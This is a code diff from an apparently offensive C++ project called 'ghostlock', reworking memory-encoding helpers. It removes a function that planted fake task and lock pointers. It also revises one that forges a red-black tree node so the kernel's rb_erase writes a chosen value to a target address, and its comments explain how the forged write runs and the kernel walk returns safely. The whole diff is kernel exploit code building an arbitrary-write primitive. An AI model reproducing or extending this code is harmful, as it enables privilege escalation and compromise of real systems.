@@ -46,13 +46,6 @@ namespace ghostlock::memory {
                span_store64(waiter, 0x28, layout.left);
     }
 
-    bool encode_multicast_waiter(std::span<std::byte> buffer,
-                                 size_t waiter_offset, size_t task_offset, size_t lock_offset,
-                                 uintptr_t fake_task, uintptr_t fake_lock) noexcept {
-        return span_store64(buffer, waiter_offset + task_offset, fake_task) &&
-               span_store64(buffer, waiter_offset + lock_offset, fake_lock);
-    }
-
     bool encode_multicast_w1_tree(std::span<std::byte> buffer,
                                   std::size_t waiter_offset, std::uintptr_t target,
                                   std::uintptr_t write_value) noexcept {
@@ -60,8 +53,13 @@ namespace ghostlock::memory {
          * rb_right @+0x08, rb_left @+0x10. The forged node is RED with
          * parent = target-8, right = NULL, left = write value: rb_erase's
          * transplant takes the left child and __rb_change_child writes it
-         * through the forged parent's right slot = *(target). */
-        if (waiter_offset + 0x18 + 8 > buffer.size()) return false;
+         * through the forged parent's right slot = *(target).
+         * Only the 24-byte tree_entry is overlayable (measured geometry:
+         * it ends exactly at the greqs copy tail); pi_tree_entry/task/lock
+         * stay at the kernel's stale real values, so the walk locks the
+         * real mutex, performs the forged transplant write, then
+         * self-cycles on the waiter task and returns safely. */
+        if (waiter_offset + 0x18 > buffer.size()) return false;
         auto at = [&](std::size_t off) {
             return buffer.subspan(waiter_offset + off, 8);
         };
